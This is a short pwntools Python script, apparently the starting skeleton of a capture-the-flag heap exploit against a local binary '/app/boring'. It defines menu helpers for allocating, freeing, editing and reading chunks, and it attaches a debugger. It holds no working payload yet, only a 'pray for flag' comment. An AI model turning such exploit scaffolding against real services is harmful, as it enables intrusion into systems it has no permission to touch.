from pwn import *

#init

e = ELF('/app/boring')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = process(e.path)
#p = remote()

#funcs

def add(x, y):
    p.sendlineafter(b'?', b'1')
    p.sendlineafter(b'?', str(x).encode())
    p.sendlineafter(b'?', str(y).encode())

def fre(x):
    p.sendlineafter(b'?', b'2')
    p.sendlineafter(b'?', str(x).encode())

def chg(x, s = b''):
    p.sendlineafter(b'?', b'3')
    p.sendlineafter(b'?', str(x).encode())
    p.sendlineafter(b'?', s)

def rd(x):
    p.sendlineafter(b'?', b'4')
    p.sendlineafter(b'?', str(x).encode())
    p.recvuntil(b': ')
    return p.recvline(keepends = False)

def ex():
    p.sendlineafter(b'?', b'5')

#vars

#exploit

add(0, 0x18)
chg(0, b'asdf')

gdb.attach(p)

print(rd(0))
fre(0)
ex()

#pray for flag

p.interactive()
